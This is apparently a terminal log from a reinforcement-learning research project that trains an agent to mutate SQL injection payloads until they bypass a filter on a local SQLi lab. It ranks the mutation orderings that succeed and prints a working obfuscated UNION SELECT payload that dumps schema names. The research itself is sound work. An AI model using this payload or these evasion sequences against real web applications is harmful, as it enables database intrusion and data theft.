@@ -1,0 +1,140 @@
+============================================================
+ TRAINING RESULTS
+============================================================
+  Total episodes     : 16160
+  Successful bypass  : 10006 (61.9%)
+  Avg steps (success): 5.76
+
+  Top mutations:
+    case                   : 13161
+    null_byte              : 11611
+    func_sp_nbsp           : 10613
+    newline                : 10113
+    agg_swap               : 9749
+
+  Shortest bypass:
+    Steps    : 4
+    Sequence : null_byte -> agg_swap -> case -> newline
+    Payload  : -1'%0aUniOn%0aDISTINCT%0aSEleCT%0a(selECT%0aJSON_ARRAYAGG(schema_name)%0afrOM%0aInfORMaTION_sCHEMA.schemata),'SEQSQLI_START','SEQSQLI_END';%00
+[*] A2C logs saved to results_a2c.json
+
+============================================================
+ RQ3 — MUTATION ORDERING ANALYSIS
+============================================================
+
+  [1] First-Step Success Rate (which mutation to apply FIRST?)
+  Action                 |     SR |  Succ / Total
+  --------------------------------------------------
+  newline                |  89.4% |  7589 /  8488  ████████
+  null_byte              |  44.5% |   301 /   677  ████
+  func_sp_nbsp           |  44.2% |    34 /    77  ████
+  agg_swap               |  44.0% |    84 /   191  ████
+  case                   |  38.9% |   831 /  2138  ███
+  hex_to_char            |  34.2% |  1128 /  3297  ███
+  case_split             |  15.8% |     6 /    38  █
+  hash_nl                |  13.6% |     3 /    22  █
+  vtab                   |  12.0% |     3 /    25  █
+  double_or              |  11.8% |     2 /    17  █
+
+  [2] Top Bigram Sequences (A -> B success rate)
+  Sequence                            |     SR | Count
+  -------------------------------------------------------
+  newline -> func_sp_nbsp             |  77.6% | 11394  ███████
+  func_sp_nbsp -> null_byte           |  72.8% | 12373  ███████
+  null_byte -> agg_swap               |  71.2% | 11438  ███████
+  agg_swap -> case                    |  63.1% | 12371  ██████
+  hex_to_char -> null_byte            |  59.0% |   173  █████
+  null_byte -> hex_to_char            |  57.1% |   366  █████
+  case_split -> func_sp_nbsp          |  57.1% |    49  █████
+  func_sp_nbsp -> hex_to_char         |  53.7% |   108  █████
+  func_sp_nbsp -> double_and          |  50.0% |     6  █████
+  ident_backtick -> between_space     |  50.0% |     2  █████
+
+  [3] Ordering Effect: A->B  vs  B->A
+  Forward                       SR  |  Reversed                      SR  |   Diff | Matters?
+  --------------------------------------------------------------------------------
+  ident_backtick -> between_space  50.0%  |    between_space -> ident_backtick   0.0%  |  +50.0% | ✓ YES
+  func_sp_nbsp -> convert_charset  45.5%  |    convert_charset -> func_sp_nbsp   0.0%  |  +45.5% | ✓ YES
+  ver_12345 -> hex_to_char   44.4%  |    hex_to_char -> ver_12345    0.0%  |  +44.4% | ✓ YES
+  agg_swap -> case           63.1%  |    case -> agg_swap           19.0%  |  +44.1% | ✓ YES
+  newline -> plus_sep        41.7%  |    plus_sep -> newline         0.0%  |  +41.7% | ✓ YES
+  newline -> dot_prefix      41.2%  |    dot_prefix -> newline       0.0%  |  +41.2% | ✓ YES
+  scientific -> func_sp_nbsp  38.5%  |    func_sp_nbsp -> scientific   0.0%  |  +38.5% | ✓ YES
+  func_sp_nbsp -> double_and  50.0%  |    double_and -> func_sp_nbsp  14.3%  |  +35.7% | ✓ YES
+  newline -> tab_space       35.3%  |    tab_space -> newline        0.0%  |  +35.3% | ✓ YES
+  double_or -> func_sp_tab   33.3%  |    func_sp_tab -> double_or    0.0%  |  +33.3% | ✓ YES
+
+  [4] Position Sensitivity (does position in sequence matter?)
+  Action                 |    pos_1 |    pos_2 |   pos_3+ |  Δ(1 vs 2)
+  ----------------------------------------------------------------------
+  between_space          |     8.0% |     4.2% |     4.0% |      +3.8%
+  gbk_bypass             |     0.0% |     0.0% |     0.0% |      +0.0%
+  dot_prefix             |     4.2% |    12.0% |     6.2% |      -7.8%
+  dbl_url_comment        |     4.8% |     0.0% |     1.0% |      +4.8%
+  func_sp_tab            |     2.3% |     4.0% |     2.1% |      -1.7%
+  distinct               |     0.0% |     8.0% |     3.7% |      -8.0%
+  url_mid_char           |     0.0% |     0.0% |     2.2% |      +0.0%
+  hex_encode             |     0.0% |     4.0% |     1.7% |      -4.0%
+  func_sp_cmt            |     2.4% |     3.1% |     1.6% |      -0.7%
+  plus_sep               |     0.0% |    33.3% |     5.0% |     -33.3%
+  ver_12345              |     3.7% |     4.5% |     8.3% |      -0.8%
+  func_sp_nbsp           |    44.2% |    96.3% |    38.4% |     -52.1%
+
+  VERDICT:
+  Ordering matters (≥10% SR gap) in 137 out of 1288 observed pairs.
+  Key pairs where order is critical:
+    ident_backtick -> between_space SR=50.0%  vs  between_space -> ident_backtick SR=0.0%
+    func_sp_nbsp -> convert_charset SR=45.5%  vs  convert_charset -> func_sp_nbsp SR=0.0%
+    ver_12345 -> hex_to_char       SR=44.4%  vs  hex_to_char -> ver_12345       SR=0.0%
+    agg_swap -> case               SR=63.1%  vs  case -> agg_swap               SR=19.0%
+    newline -> plus_sep            SR=41.7%  vs  plus_sep -> newline            SR=0.0%
+
+[*] Ordering analysis saved to: ordering_a2c.json
+
+[*] Total HTTP requests: 112994
+neet@localheart:/mnt/d/Kuliah/RL/SeqSQLi$ python3 -m tools.evaluate_ifnr_spbarc \
+    --method a2c --a2c-model models/a2c_union_stage1.zip \
+    --payloads payloads_union_less1.csv \
+    --url http://localhost:8080/Less-1/ --param id \
+    --max-steps 15 --stochastic --output eval_a2c_union.json
+[*] Loaded 108 validated payloads
+/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
+  warnings.warn(
+[*] Method=a2c | max_steps=15 | sampling=stochastic | attempts=1 | target=http://localhost:8080/Less-1/
+  [  10/108] success=10 (initial=0)
+  [  20/108] success=20 (initial=0)
+  [  30/108] success=30 (initial=0)
+  [  40/108] success=39 (initial=0)
+  [  50/108] success=49 (initial=0)
+  [  60/108] success=59 (initial=0)
+  [  70/108] success=69 (initial=0)
+  [  80/108] success=71 (initial=0)
+  [  90/108] success=77 (initial=0)
+  [ 100/108] success=83 (initial=0)
+  [ 108/108] success=83 (initial=0)
+
+============================================================
+ RESULTS: method=a2c
+============================================================
+  Payloads             : 108
+  Initial bypasses     : 0  (within-run FNR0=0.0000)
+  Total successes      : 83
+  Mutated bypasses     : 83
+  FNR0 (used)          : 0.0000  (measured)
+  MFNR                 : 0.7685
+  IFNR                 : +0.7685
+  SPBARC               : 10.08
+  Inference requests   : 837
+  Training requests    : 0 (reported-only)
+  Wall clock           : 55.5s
+  Report saved to      : eval_a2c_union.json
+neet@localheart:/mnt/d/Kuliah/RL/SeqSQLi$ python3 -m tools.breakdown_by_tier eval_a2c_union.json
+== Per-tier breakdown: eval_a2c_union.json ==
+  tier     |  succ /  tot |     SR | via agg_swap
+  ------------------------------------------------
+  trivial  |    36 /   36 | 100.0% |            0
+  medium   |    35 /   36 |  97.2% |           35
+  complex  |    12 /   36 |  33.3% |           12
+  ------------------------------------------------
+  ALL      |    83 /  108 |  76.9% |           47
+neet@localheart:/mnt/d/Kuliah/RL/SeqSQLi$
